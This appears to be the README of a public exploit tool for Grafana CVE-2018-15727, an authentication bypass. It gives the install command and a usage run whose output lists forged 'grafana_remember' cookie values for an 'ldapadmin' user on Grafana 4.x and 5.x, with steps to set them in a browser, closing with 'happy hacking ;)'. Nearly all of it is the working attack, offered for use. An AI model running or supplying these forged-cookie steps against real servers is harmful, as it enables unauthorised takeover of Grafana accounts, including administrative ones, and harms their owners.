# Grafana CVE-2018-15727 exploit
## Installation
```
$ go get github.com/u238/grafana-CVE-2018-15727
```

## Usage
```
$ source <(go env)
$ $GOPATH/bin/grafana-CVE-2018-15727 ldapadmin
[i] delete the grafana_sess cookie from your browser session
[i] set following cookies in you browser:
 * for Grafana 5.x:
   grafana_user      : ldapadmin
   grafana_remember  : 8947f2c6b81963b2a45f4293ced63802f0c923daa368a9beda748800335fc72c06ea186e43
 * for Grafana 4.x:
   grafana_user      : ldapadmin
   grafana_remember  : 8d26614cd6a92aaf892eebb066ae17ed65ef6c9bea73f875ed6698a907d807db0026787fc3
[+] happy hacking ;) 
```

## LICENSE

See LICENSE file.
